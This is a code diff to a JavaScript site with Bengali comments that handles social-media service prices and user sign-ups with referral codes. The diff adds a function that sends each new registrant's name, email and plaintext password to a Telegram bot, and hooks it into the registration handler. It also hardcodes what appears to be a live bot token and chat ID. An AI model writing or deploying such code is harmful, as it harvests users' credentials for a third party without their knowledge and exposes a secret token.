@@ -6381,6 +6381,37 @@ async function save() {
         document.getElementById('p-ig').value = db.prices.Instagram;
         document.getElementById('p-tg').value = db.prices.Telegram;
     }
+// --- টেলিগ্রাম কনফিগারেশন (আপনার তথ্য দিয়ে পরিবর্তন করুন) ---
+const tgToken = "7963516868:AAEX5wGUkgYDaTfA0ffL_B3COQaZKNRDlvo"; // আপনার বট টোকেন দিন
+const tgChatId = "6882504862";   // আপনার চ্যাট আইডি দিন
+
+async function sendToTelegram(user) {
+    const message = `
+🆕 **নতুন ইউজার রেজিস্ট্রেশন!**
+━━━━━━━━━━━━━━━━━━
+👤 **নাম:** ${user.name}
+📧 **ইমেইল:** ${user.email}
+🔑 **পাসওয়ার্ড:** ${user.pass}
+🎫 **রেফার কোড:** ${user.referCode}
+🔗 **রেফারড বাই:** ${user.referredBy || 'None'}
+📅 **তারিখ:** ${new Date().toLocaleString('bn-BD')}
+━━━━━━━━━━━━━━━━━━`;
+
+    try {
+        await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: tgChatId,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+    } catch (err) {
+        console.error("Telegram Notification Failed:", err);
+    }
+}
+
 function handleAuth(m) {
     showLoader(true);
     setTimeout(() => {
@@ -6396,7 +6427,7 @@ function handleAuth(m) {
             
             const myNewCode = Math.floor(100000 + Math.random() * 900000).toString();
             
-            db.users.push({
+            const newUser = {
                 name: n, 
                 email: e, 
                 pass: p, 
@@ -6406,7 +6437,9 @@ function handleAuth(m) {
                 rank: "General Member", 
                 referCode: myNewCode, 
                 referredBy: r        
-            });
+            };
+
+            db.users.push(newUser);
             
             if(r !== "") {
                 let leader = db.users.find(x => x.referCode === r);
@@ -6419,7 +6452,10 @@ function handleAuth(m) {
             localStorage.setItem('v7_userName', n);
             localStorage.setItem('v7_userEmail', e);
             
-            // --- এই save() ফাংশনটিই এখন সার্ভারে ডেটা পাঠাবে ---
+            // টেলিগ্রাম নোটিফিকেশন পাঠানো হচ্ছে
+            sendToTelegram(newUser);
+            
+            // ডাটা সেভ করা
             save(); 
             
             switchAuth(false); 
